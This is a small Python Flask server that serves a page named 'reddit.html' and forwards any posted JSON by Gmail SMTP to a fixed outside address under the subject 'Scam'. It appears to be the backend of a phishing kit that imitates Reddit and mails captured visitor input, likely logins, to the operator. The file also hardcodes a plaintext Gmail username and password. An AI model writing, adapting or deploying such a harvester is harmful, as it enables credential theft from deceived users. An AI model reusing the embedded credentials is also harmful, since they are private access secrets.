
from flask import Flask, request, send_file
import json
import smtplib
app = Flask(__name__)

@app.route('/sendemail', methods=['POST'])
def send_email():
    # You can use the following email
    # to send your emails.
    try:
        gmail_user = 'helpmewithmycodinghomework@gmail.com'
        gmail_password = 'himynameistravis'
        request_data=request.get_json()
        sent_from = gmail_user
        to = ['therealrp231@gmail.com']

        subject = 'Scam'
        body = request_data

        print(body)

        email_text = """
            From: %s
            To: %s
            MIME-Version: 1.0
            Content-type: text/html
            Subject: %s

            %s
            """ % (sent_from, ", ".join(to), subject, body)

        print(email_text)

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(gmail_user, gmail_password)
            server.sendmail(sent_from, to, email_text)
            server.close()
            print('Email sent!')
        except:
            print('Something went wrong...')

        return "Ok"
    except Exception as error:
        return error

@app.route('/')
def ShowPage():
    try:
        return send_file('reddit.html')
    except Exception as e:
        return e

if __name__ == '__main__':
    app.run()
